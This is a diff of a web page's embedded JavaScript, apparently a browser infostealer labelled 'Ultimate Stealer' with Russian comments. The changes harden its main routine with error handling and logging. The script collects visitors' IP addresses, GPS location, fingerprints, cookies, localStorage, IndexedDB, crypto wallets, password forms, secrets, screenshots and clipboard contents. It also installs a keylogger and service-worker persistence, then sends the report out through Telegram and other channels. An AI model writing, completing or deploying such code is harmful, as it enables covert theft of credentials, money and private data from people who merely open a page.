-                                };
+                                result.rotationRate = { alpha: e.rotationRate.alpha, beta: e.rotationRate.beta, gamma: e.rotationRate.gamma };
                             }
                             window.removeEventListener('devicemotion', handler);
                             resolve(result);
                         };
                         window.addEventListener('devicemotion', handler, { once: true });
                     }
-                } catch {}
+                } catch (e) {}
                 setTimeout(() => resolve(result), 1000);
             });
         }
 
         // ================================================================
-        // 16. ФОРМАТИРОВАНИЕ ОТЧЁТА
+        // 17. ФОРМАТИРОВАНИЕ ОТЧЁТА
         // ================================================================
         function formatReport(data) {
             const lines = [];
@@ -776,7 +854,6 @@
             lines.push('═'.repeat(40));
             lines.push('');
 
-            // Сеть
             if (data.network) {
                 const n = data.network;
                 if (n.ips && n.ips.length) {
@@ -792,12 +869,8 @@
                     lines.push('');
                 }
                 const allIPs = [];
-                if (n.webrtc && n.webrtc.public && n.webrtc.public.length) {
-                    allIPs.push(...n.webrtc.public);
-                }
-                if (n.ips) {
-                    n.ips.forEach(i => { if (i.ip) allIPs.push(i.ip); });
-                }
+                if (n.webrtc && n.webrtc.public) allIPs.push(...n.webrtc.public);
+                if (n.ips) n.ips.forEach(i => { if (i.ip) allIPs.push(i.ip); });
                 if (allIPs.length) {
                     lines.push(`🌐 ВСЕ IP: ${[...new Set(allIPs)].join(', ')}`);
                     lines.push('');
@@ -823,24 +896,20 @@
                 }
             }
 
-            // GPS            if (data.gps) {
+            if (data.gps) {
                 lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon} (${data.gps.acc}m)`);
                 lines.push('');
             }
 
-            // Устройство
             if (data.device) {
                 const d = data.device;
                 lines.push(`💻 ${d.os || 'unknown'} ${d.osVersion || ''}, ${d.browser || ''} ${d.browserVersion || ''}`);
                 if (d.model && d.model !== 'unknown') lines.push(`📱 Модель: ${d.model}`);
                 lines.push(`   ${d.cores || '?'} ядер, ${d.memory || '?'}GB RAM`);
-                if (d.screen) {
-                    lines.push(`   Экран: ${d.screen.width}x${d.screen.height} (${d.screen.pixelRatio}x)`);
-                }
+                if (d.screen) lines.push(`   Экран: ${d.screen.width}x${d.screen.height} (${d.screen.pixelRatio}x)`);
                 lines.push('');
             }
 
-            // Фингерпринты
             if (data.fingerprints) {
                 const f = data.fingerprints;
                 if (f.webgl && f.webgl.renderer) lines.push(`🎯 WebGL: ${f.webgl.renderer}`);
@@ -850,11 +919,9 @@
                     const fonts = f.fonts.slice(0, 8);
                     lines.push(`🎯 Шрифты: ${fonts.join(', ')}${f.fonts.length > 8 ? '...' : ''}`);
                 }
-                if (f.canvas) lines.push(`🎯 Canvas: ${f.canvas.slice(0, 30)}...`);
                 lines.push('');
             }
 
-            // Storage
             if (data.storage) {
                 const ls = data.storage.localStorage || {};
                 const keys = Object.keys(ls);
@@ -867,23 +934,19 @@
                     lines.push('');
                 }
                 if (data.storage.cookies && data.storage.cookies !== 'нет') {
-                    const c = data.storage.cookies;
-                    lines.push(`🍪 Куки: ${trunc(c, 100)}`);
+                    lines.push(`🍪 Куки: ${trunc(data.storage.cookies, 100)}`);
                     lines.push('');
                 }
             }
 
-            // IndexedDB
             if (data.indexedDB && data.indexedDB.length) {
                 lines.push(`🗄️ IndexedDB (${data.indexedDB.length} БД):`);
                 data.indexedDB.forEach(db => {
-                    const stores = db.stores?.length || 0;
-                    lines.push(`   ${db.name} (${stores} stores)`);
+                    lines.push(`   ${db.name} (${db.stores?.length || 0} stores)`);
                 });
                 lines.push('');
             }
 
-            // Криптовалюта
             if (data.wallets && data.wallets.length) {
                 lines.push(`💰 Криптокошельки:`);
                 data.wallets.forEach(w => {
@@ -894,13 +957,11 @@
                 lines.push('');
             }
 
-            // Расширения
             if (data.extensions && data.extensions.length) {
                 lines.push(`🔌 Расширения: ${data.extensions.join(', ')}`);
                 lines.push('');
             }
 
-            // Пароли
             if (data.passwords && data.passwords.length) {
                 lines.push(`🔓 Найдены формы (${data.passwords.length}):`);
                 data.passwords.forEach(form => {
@@ -915,7 +976,6 @@
                 lines.push('');
             }
 
-            // Секреты
             if (data.secrets && data.secrets.length) {
                 lines.push(`🔑 Секреты (${data.secrets.length}):`);
                 data.secrets.slice(0, 8).forEach(s => {
@@ -925,54 +985,41 @@
                 lines.push('');
             }
 
-            // DOM
             if (data.dom) {
                 const d = data.dom;
                 lines.push(`🌐 Страница: ${d.url || 'unknown'}`);
                 if (d.title) lines.push(`   Заголовок: ${d.title}`);
                 if (d.referrer && d.referrer !== 'нет') lines.push(`↩️ ${d.referrer}`);
-                lines.push(`   Формы: ${d.forms}, Inputs: ${d.inputs}, Ссылки: ${d.links}`);
                 lines.push('');
             }
 
-            // Скриншот
             if (data.screenshot) {
                 const size = Math.round(data.screenshot.length / 1024);
                 lines.push(`🖼 Скриншот: ${size} КБ`);
                 lines.push('');
             }
 
-            // Keylogger
             if (data.keylogger) {
                 lines.push(`⌨️ Keylogger: активен`);
                 lines.push('');
             }
 
-            // Буфер обмена
             if (data.clipboard) {
                 lines.push(`📋 Буфер обмена: ${trunc(data.clipboard, 100)}`);
                 lines.push('');
             }
 
-            // Service Worker
             if (data.persistence) {
                 lines.push(`♻️ Service Worker: зарегистрирован`);
                 lines.push('');
             }
 
-            // Сенсоры
-            if (data.sensors) {
+            if (data.sensors && data.sensors.battery) {
                 const s = data.sensors;
-                if (s.battery) {
-                    lines.push(`🔋 Батарея: ${s.battery.level}%${s.battery.charging ? ' (зарядка)' : ''}`);
-                }
+                lines.push(`🔋 Батарея: ${s.battery.level}%${s.battery.charging ? ' (зарядка)' : ''}`);
                 if (s.acceleration) {
                     const a = s.acceleration;
                     lines.push(`📱 Акселерометр: x=${a.x?.toFixed(2)}, y=${a.y?.toFixed(2)}, z=${a.z?.toFixed(2)}`);
-                }
-                if (s.rotationRate) {
-                    const r = s.rotationRate;
-                    lines.push(`🔄 Гироскоп: α=${r.alpha?.toFixed(2)}, β=${r.beta?.toFixed(2)}, γ=${r.gamma?.toFixed(2)}`);
                 }
                 lines.push('');
             }
@@ -985,18 +1032,20 @@
         }
 
         // ================================================================
-        // 17. ГЛАВНАЯ ФУНКЦИЯ — ВСЁ ВМЕСТЕ
+        // 18. ГЛАВНАЯ ФУНКЦИЯ — ВСЁ ВМЕСТЕ
         // ================================================================
         (async function ultimateStealer() {
             try {
-                setStatus('⏳');
+                setStatus('⏳ Сбор...');
                 const start = performance.now();
 
-                // Keylogger и Persistence сразу
+                // Keylogger и Persistence
                 const keylogger = setupKeylogger();
                 const persistence = setupPersistence();
 
-                // Параллельный сбор ВСЕХ данных
+                log('📊 Параллельный сбор данных...');
+
+                // Параллельный сбор
                 const [
                     networkData,
                     gps,
@@ -1012,62 +1061,77 @@
                     clipboard,
                     sensors
                 ] = await Promise.all([
-                    getNetworkData(),
-                    getGPS(),
-                    Promise.resolve(getDeviceInfo()),
-                    Promise.resolve(getFingerprints()),
-                    Promise.resolve(getStorage()),
-                    getIndexedDB(),
-                    Promise.resolve(getWallets()),
-                    Promise.resolve(getExtensions()),
-                    Promise.resolve(getPasswords()),
-                    Promise.resolve(getDOM()),
-                    takeScreenshot(),
-                    getClipboard(),
-                    getSensors()
+                    getNetworkData().catch(e => { log('⚠️ Network error: ' + e.message); return {}; }),
+                    getGPS().catch(e => null),
+                    Promise.resolve(getDeviceInfo()).catch(e => ({})),
+                    Promise.resolve(getFingerprints()).catch(e => ({})),
+                    Promise.resolve(getStorage()).catch(e => ({})),
+                    getIndexedDB().catch(e => null),
+                    Promise.resolve(getWallets()).catch(e => []),
+                    Promise.resolve(getExtensions()).catch(e => []),
+                    Promise.resolve(getPasswords()).catch(e => []),
+                    Promise.resolve(getDOM()).catch(e => ({ url: window.location.href })),
+                    takeScreenshot().catch(e => null),
+                    getClipboard().catch(e => null),
+                    getSensors().catch(e => ({}))
                 ]);
 
-                // Секреты из Storage
-                const secrets = findSecrets(storage);
+                // Секреты
+                let secrets = [];
+                try {
+                    secrets = findSecrets(storage);
+                } catch (e) { log('⚠️ Secrets error: ' + e.message); }
 
-                // Формируем финальные данные
+                log('✅ Сбор завершён');
+
                 const fullData = {
                     timestamp: new Date().toISOString(),
                     url: window.location.href,
                     userAgent: navigator.userAgent,
-                    network: networkData,
-                    gps: gps,
-                    device: device,
-                    fingerprints: fingerprints,
-                    storage: storage,
-                    indexedDB: indexedDB,
-                    wallets: wallets,
-                    extensions: extensions,
-                    passwords: passwords,
-                    secrets: secrets,
-                    dom: dom,
-                    screenshot: screenshot,
-                    clipboard: clipboard,
-                    keylogger: keylogger,
-                    persistence: persistence,
-                    sensors: sensors,
+                    network: networkData || {},
+                    gps: gps || null,
+                    device: device || {},
+                    fingerprints: fingerprints || {},
+                    storage: storage || {},
+                    indexedDB: indexedDB || null,
+                    wallets: wallets || [],
+                    extensions: extensions || [],
+                    passwords: passwords || [],
+                    secrets: secrets || [],
+                    dom: dom || {},
+                    screenshot: screenshot || null,
+                    clipboard: clipboard || null,
+                    keylogger: keylogger || false,
+                    persistence: persistence || false,
+                    sensors: sensors || {},
                     performance: Math.round(performance.now() - start)
                 };
 
                 // Отчёт
                 const report = formatReport(fullData);
-                setStatus('📤');
+                log(`📊 Отчёт: ${report.length} символов`);
+
+                setStatus('📤 Отправка...');
 
                 // Отправка
-                const result = await exfiltrate(report, fullData);
+                const results = await exfiltrate(report, fullData);
+                const ok = results.filter(r => r.ok).length;
 
-                setStatus('✅');
+                if (ok > 0) {
+                    setStatus('✅ Отправлено!');
+                    log(`✅ Успешно! ${ok}/${results.length} каналов`);
+                } else {
+                    setStatus('⚠️ Ошибка');
+                    log('❌ Все каналы отправки не сработали');
+                }
+
                 setTimeout(() => {
-                    document.getElementById('status').style.opacity = '0';
-                }, 2000);
+                    statusEl.style.opacity = '0';
+                }, 3000);
 
             } catch (e) {
-                setStatus('⚠️');
+                setStatus('⚠️ Ошибка');
+                log('❌ Критическая ошибка: ' + e.message);
                 console.error(e);
             }
         })();
@@ -1075,15 +1139,24 @@
         // ================================================================
         // ЗАПУСК
         // ================================================================
-        setTimeout(ultimateStealer, 200);
+        setTimeout(ultimateStealer, 300);
 
         // Тест в консоли
         window.testNow = async function() {
-            const r = await fetch('https://api.ipify.org?format=json');
-            const d = await r.json();
-            await sendTelegram(`🧪 Test IP: ${d.ip}`);
-            console.log('✅ Test sent');
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                const msg = `🧪 Test IP: ${d.ip}\nTime: ${new Date().toISOString()}`;
+                await sendTelegram(msg);
+                console.log('✅ Test sent');
+            } catch (e) {
+                console.error('❌ Test error:', e);
+            }
         };
+
+        console.log('✅ Ultimate Stealer loaded. Откройте консоль для отладки.');
+        console.log('📋 Для теста: testNow()');
+        console.log('🔍 Отладочная панель в правом верхнем углу');
 
     </script>
 </body>
